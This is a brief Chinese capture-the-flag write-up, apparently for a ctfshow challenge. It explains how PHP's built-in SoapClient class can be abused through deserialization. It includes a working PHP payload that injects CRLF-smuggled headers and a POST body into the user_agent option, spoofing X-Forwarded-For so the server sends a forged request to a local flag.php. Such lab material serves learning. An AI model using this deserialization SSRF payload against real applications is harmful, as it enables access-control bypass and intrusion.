php原生类利用，参考:https://blog.csdn.net/qq_53287512/article/details/123879744?fromshare=blogdetail&sharetype=blogdetail&sharerId=123879744&sharerefer=PC&sharesource=baobaolong6666&sharefrom=from_link

使用不存在的getFlag()函数会触发SoapClient::__call，调用SOAP函数，public SoapClient :: SoapClient(mixed $wsdl [，array $options ])。
第一个参数是用来指明是否是wsdl模式，如果为`null`，那就是非wsdl模式。
第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
本题只需把ip设置为127.0.0.1，token为ctfshow。
```
<?php
$ua = "ceshi\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow";

$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));

echo urlencode(serialize($client));
?>
```
flag : 
